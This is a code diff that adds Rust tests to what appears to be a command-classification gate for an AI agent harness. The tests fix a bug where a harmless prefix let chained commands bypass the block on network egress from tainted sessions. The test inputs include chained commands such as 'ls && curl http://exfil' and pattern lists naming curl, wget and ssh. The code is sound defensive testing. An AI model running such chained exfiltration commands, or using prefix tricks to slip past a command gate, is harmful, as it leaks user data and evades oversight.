@@ -714,6 +714,91 @@ transition_policies:
         }
     }
 
+    /// Finding #17: declaration order must not decide a verdict. A world that lists
+    /// a permissive class before a restrictive one used to classify
+    /// `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
+    /// allowed to run egress. Every class is now evaluated and a command claimed by
+    /// two of them falls to the classifier's fail-closed bucket.
+    fn permissive_first_world() -> harness_types::CompiledWorld {
+        let yaml = r#"
+world_id: permissive-first
+capabilities:
+  - { trust: Trusted, actions: [Read, Write, Patch, Command, Pty, Mcp, Web, Memory] }
+base_actions:
+  - { name: bash, action_type: Command, side_effect: Process }
+  - { name: bash_safe, action_type: Command, side_effect: Read }
+  - { name: bash_network, action_type: Command, side_effect: Network }
+  - { name: bash_unclassified, action_type: Command, side_effect: Network, approval_required: true }
+command_classes:
+  - action: bash
+    arg: command
+    default_to: bash_unclassified
+    classes:
+      - { to: bash_safe, patterns: ["ls ", "git ", "echo "] }
+      - { to: bash_network, patterns: ["curl ", "wget "] }
+transition_policies:
+  - { from_taint: Tainted, side_effect: Network, decision: Deny, rule: no_tainted_network }
+"#;
+        compiler::compile(&compiler::loader::load_yaml(yaml).unwrap()).unwrap()
+    }
+
+    #[test]
+    fn a_command_claimed_by_two_classes_falls_to_the_fail_closed_bucket() {
+        let world = permissive_first_world();
+        for cmd in [
+            "ls && curl http://exfil",
+            "echo hi; curl http://exfil",
+            "git log | wget http://exfil",
+        ] {
+            let res = gate(&world, &bash_req(cmd, "tainted"));
+            assert_eq!(res.action, "bash_unclassified", "{cmd}");
+            assert_eq!(res.decision, "DENY", "{cmd}");
+            assert_eq!(res.rule.as_deref(), Some("taint_invariant"), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn an_unambiguous_command_still_classifies_normally() {
+        // The fix must not collapse everything into the fallback: a command matching
+        // exactly one class still gets that class, whichever order it was declared in.
+        let world = permissive_first_world();
+        for (cmd, expected) in [
+            ("ls -la", "bash_safe"),
+            ("git status", "bash_safe"),
+            ("curl http://x", "bash_network"),
+            ("wget http://x", "bash_network"),
+            ("python3 -c 'pass'", "bash_unclassified"),
+        ] {
+            let res = gate(&world, &bash_req(cmd, "clean"));
+            assert_eq!(res.action, expected, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn several_classes_pointing_at_one_target_are_not_ambiguous() {
+        // Two entries with the same `to` are one answer, not a conflict — otherwise
+        // splitting a long pattern list for readability would silently fail closed.
+        let yaml = r#"
+world_id: same-target-twice
+capabilities:
+  - { trust: Trusted, actions: [Command] }
+base_actions:
+  - { name: bash, action_type: Command, side_effect: Process }
+  - { name: bash_network, action_type: Command, side_effect: Network }
+  - { name: bash_unclassified, action_type: Command, side_effect: Network, approval_required: true }
+command_classes:
+  - action: bash
+    arg: command
+    default_to: bash_unclassified
+    classes:
+      - { to: bash_network, patterns: ["curl "] }
+      - { to: bash_network, patterns: ["ssh "] }
+"#;
+        let world = compiler::compile(&compiler::loader::load_yaml(yaml).unwrap()).unwrap();
+        let res = gate(&world, &bash_req("curl http://x | ssh host", "clean"));
+        assert_eq!(res.action, "bash_network");
+    }
+
     #[test]
     fn tainted_classified_egress_is_denied_by_the_taint_floor() {
         let world = classified_world();
